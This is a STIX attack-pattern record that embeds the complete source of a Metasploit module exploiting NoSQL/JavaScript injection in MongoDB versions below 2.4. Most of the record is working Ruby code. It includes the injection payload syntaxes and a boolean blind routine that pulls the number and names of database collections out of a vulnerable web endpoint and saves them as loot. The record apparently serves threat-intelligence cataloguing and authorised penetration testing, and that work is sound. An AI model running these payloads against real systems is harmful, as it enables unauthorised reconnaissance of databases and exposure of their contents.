{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f22abd2-ef7c-4ca4-8df8-e183b2eef8b8",
    "created": "2024-08-14T16:32:31.741459Z",
    "modified": "2024-08-14T16:32:31.741463Z",
    "name": "\"MongoDB NoSQL Collection Enumeration Via Injection\"",
    "description": " This module can exploit NoSQL injections on MongoDB versions less than 2.4 and enumerate the collections available in the data via boolean injections.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/mongodb_js_inject_collection_enum.rb",
            "external_id": "mongodb_js_inject_collection_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-nodejs-server-side#_=_"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MongoDB NoSQL Collection Enumeration Via Injection\",\n      'Description'    => %q{\n      This module can exploit NoSQL injections on MongoDB versions less than 2.4\n      and enumerate the collections available in the data via boolean injections.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        ['Brandon Perry <bperry.volatile[at]gmail.com>'],\n      'References'     =>\n        [\n          ['URL', 'https://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-nodejs-server-side#_=_']\n        ],\n      'Platform'       => ['linux', 'win'],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-06-07'))\n\n      register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Full vulnerable URI with [NoSQLi] where the injection point is', '/index.php?age=50[NoSQLi]'])\n      ])\n  end\n\n  def syntaxes\n    [[\"\\\"'||this||'\", \"'||[inject]||'\"],\n     [\"\\\"';return+true;var+foo='\", \"';return+[inject];var+foo='\"],\n     ['\\'\"||this||\"','\"||[inject]||\"'],\n     ['\\'\";return+true;var+foo=\"', '\";return+[inject];var+foo=\"'],\n     [\"||this\",\"||[inject]\"]]\n  end\n\n  def run\n    uri = datastore['TARGETURI']\n\n    res = send_request_cgi({\n      'uri' => uri.sub('[NoSQLi]', '')\n    })\n\n    if !res\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way.\")\n    end\n\n    pay = \"\"\n    fals = res.body\n    tru = nil\n\n    syntaxes.each do |payload|\n      print_status(\"Testing \" + payload[0])\n      res = send_request_cgi({\n        'uri' => uri.sub('[NoSQLi]', payload[0])\n      })\n\n      if res and res.body != fals and res.code == 200\n        print_status(\"Looks like \" + payload[0] + \" works\")\n        tru = res.body\n\n        res = send_request_cgi({\n          'uri' => uri.sub('[NoSQLi]', payload[0].sub('true', 'false').sub('this', '!this'))\n        })\n\n        if res and res.body != tru and res.code == 200\n          vprint_status(\"I think I confirmed with a negative test.\")\n          fals = res.body\n          pay = payload[1]\n          break\n        end\n      end\n    end\n\n    if pay == ''\n      fail_with(Failure::Unknown, \"Couldn't detect a payload, maybe it isn't injectable.\")\n    end\n\n    length = 0\n    vprint_status(\"Getting length of the number of collections.\")\n    (0..100).each do |len|\n      str = \"db.getCollectionNames().length==#{len}\"\n      res = send_request_cgi({\n        'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))\n      })\n\n      if res and res.body == tru\n        length = len\n        print_status(\"#{len} collections are available\")\n        break\n      end\n    end\n\n    vprint_status(\"Getting collection names\")\n\n    names = []\n    (0...length).each do |i|\n      vprint_status(\"Getting length of name for collection \" + i.to_s)\n\n      name_len = 0\n      (0..100).each do |k|\n        str = \"db.getCollectionNames()[#{i}].length==#{k}\"\n        res = send_request_cgi({\n          'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))\n        })\n\n        if res and res.body == tru\n          name_len = k\n          print_status(\"Length of collection #{i}'s name is #{k}\")\n          break\n        end\n      end\n\n      vprint_status(\"Getting collection #{i}'s name\")\n\n      name = ''\n      (0...name_len).each do |k|\n        [*('a'..'z'),*('0'..'9'),*('A'..'Z'),'.'].each do |c|\n          str = \"db.getCollectionNames()[#{i}][#{k}]=='#{c}'\"\n          res = send_request_cgi({\n            'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))\n          })\n\n          if res and res.body == tru\n            name << c\n            break\n          end\n        end\n      end\n\n      print_status(\"Collections #{i}'s name is \" + name)\n      names << name\n    end\n\n    p = store_loot(\"mongo_injection.#{datastore['RHOST']}_collections\",\n                   \"text/plain\",\n                   nil,\n                   names.to_json,\n                   \"mongo_injection_#{datastore['RHOST']}.txt\",\n                   \"#{datastore[\"RHOST\"]} MongoDB Javascript Injection Collection Enumeration\")\n\n    print_good(\"Your collections are located at: \" + p)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-07",
    "x_mitre_platforms": [
        "['linux', 'win']"
    ]
}